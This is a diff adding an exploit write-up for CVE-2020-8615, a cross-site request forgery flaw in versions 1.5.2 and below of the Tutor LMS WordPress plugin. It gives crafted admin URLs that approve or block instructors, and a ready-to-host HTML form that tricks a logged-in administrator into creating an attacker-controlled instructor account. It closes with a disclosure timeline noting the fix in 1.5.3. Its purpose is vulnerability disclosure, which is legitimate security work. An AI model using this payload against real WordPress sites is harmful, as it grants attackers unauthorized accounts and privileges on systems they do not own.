@@ -1,0 +1,55 @@
+# Exploit Title: Wordpress Plugin Tutor LMS 1.5.3 - Cross-Site Request Forgery (Add User)
+# Date: 2020-01-30
+# Vendor Homepage: https://www.themeum.com/product/tutor-lms/
+# Vendor Changelog: https://wordpress.org/plugins/tutor/#developers
+# Exploit Author: Jinson Varghese Behanan
+# Author Advisory: https://www.getastra.com/blog/911/plugin-exploit/cross-site-request-forgery-in-tutor-lms-plugin/
+# Author Homepage: https://www.jinsonvarghese.com
+# Version: 1.5.2 and below
+# CVE : CVE-2020-8615
+
+# 1. Description
+
+# The Tutor LMS WordPress plugin is a feature-packed plugin that enables users to create and sell courses. 
+# An attacker can use CSRF to register themselves as an instructor or block other legit instructors. 
+# Consequently, if the option to create courses without admin approval is enabled on the plugin’s settings 
+# page, the attacker will be able to create courses directly as well. All WordPress websites 
+# using Tutor LMS version 1.5.2 and below are affected.
+
+# 2. Proof of Concept
+
+# As the requests for the approval and blocking of instructors are sent using the GET method, the CSRF 
+# attack to approve an attacker-controlled instructor account can be performed by having the admin 
+# visit https://TARGET/wp-admin/admin.php?page=tutor-instructors&action=approve&instructor=8 directly, 
+# after retrieving the instructor ID during the registration process. An approved instructor can also be blocked 
+# by directing the admin to visit https://TARGET/wp-admin/admin.php?page=tutor-instructors&action=blocked&instructor=7.
+
+# CSRF attack can also be performed on the form present at https://TARGET/wp-admin/admin.php?page=tutor-instructors&sub_page=add_new_instructor 
+# in order to have the admin add an instructor account for the attacker, thus bypassing the requirement for approval. 
+# This can be done by tricking the admin to submit the below-given web form as a POST request. For example, if the web form is 
+# hosted on an attacker-controlled domain https://attacker.com/csrf.html, an admin who is logged in at https://TARGET can 
+# be tricked into visiting the link and triggering the request to add an instructor.
+
+<html>
+	<body>
+		<script>history.pushState('', '', '/')</script>
+		<form action="https://TARGET/wp-admin/admin-ajax.php" method="POST">
+			<input type="hidden" name="action" value="add&#95;new&#95;instructor" />
+			<input type="hidden" name="first&#95;name" value="John" />
+			<input type="hidden" name="last&#95;name" value="Doe" />
+			<input type="hidden" name="user&#95;login" value="jd_instructor" />
+			<input type="hidden" name="email" value="jd@TARGET" />
+			<input type="hidden" name="phone&#95;number" value="1231231231" />
+			<input type="hidden" name="password" value="Pa&#36;&#36;w0rd&#33;" /> 
+			<input type="hidden" name="password&#95;confirmation" value="Pa&#36;&#36;w0rd&#33;" />
+			<input type="hidden" name="tutor&#95;profile&#95;bio" value="Et&#32;tempore&#32;culpa&#32;n" />
+			<input type="hidden" name="action" value="tutor&#95;add&#95;instructor" /> 
+			<input type="submit" value="Submit request" />
+		</form> 
+	</body>
+</html>
+
+3. Timeline
+
+Vulnerability reported to the Tutor LMS team – January 30, 2020.
+Tutor LMS version 1.5.3 containing the fix released – February 4, 2020.
